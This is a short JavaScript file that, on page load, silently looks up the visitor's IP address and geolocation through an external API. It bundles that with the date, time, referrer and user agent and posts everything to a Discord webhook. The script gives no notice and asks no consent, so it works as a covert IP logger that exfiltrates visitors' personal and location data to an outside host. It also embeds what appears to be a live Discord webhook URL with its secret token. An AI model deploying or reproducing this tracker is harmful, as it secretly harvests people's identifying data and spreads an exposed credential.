// script.js
// Function to send data to Discord webhook
function sendToDiscord(data) {
  
    const webhookUrl = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT';

    // Create a message payload
    const message = {
        content: "Combined Data",
        embeds: [
            {
                title: "User Information",
                fields: [
                    { name: "Date", value: data.userInfo.date.toString(), inline: true },
                    { name: "Day", value: data.userInfo.day, inline: true },
                    { name: "Time", value: data.userInfo.time, inline: true },
                    { name: "Referring URL", value: data.userInfo.referringURL },
                    { name: "User Agent", value: data.userInfo.userAgent },
                ],
            },
            {
                title: "IP Details",
                fields: [
                    { name: "IP Address", value: data.ipDetails.ip },
                    { name: "City", value: data.ipDetails.city },
                    { name: "Region", value: data.ipDetails.region },
                    { name: "Country", value: data.ipDetails.country },
                ],
            },
        ],
    };

    // Send the message to Discord
    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
    })
    .then(response => response.json())
    .then(responseData => console.log("Data sent to Discord:", responseData))
    .catch(error => console.error("Error sending data to Discord:", error));
}

// Fetch IP details from the Abstract API
fetch("https://app.abstractapi.com/q", {
    method: "GET",
    headers: {
        "X-API-KEY": "YOUR_ABSTRACTAPI_KEY", // Replace with your Abstract API key
    },
})
    .then(response => response.json())
    .then(ipData => {
        // Collect user information
        const userInformation = {
            date: new Date(),
            day: new Intl.DateTimeFormat('en-US', { weekday: 'long' }).format(new Date()),
            time: new Intl.DateTimeFormat('en-US', { timeStyle: 'short' }).format(new Date()),
            referringURL: document.referrer,
            userAgent: navigator.userAgent,
        };

        // Combine IP and user data
        const combinedData = {
            ipDetails: ipData,
            userInfo: userInformation,
        };

        // Send data to Discord webhook
        sendToDiscord(combinedData);
    })
    .catch(error => console.error("Error fetching IP details: ", error));
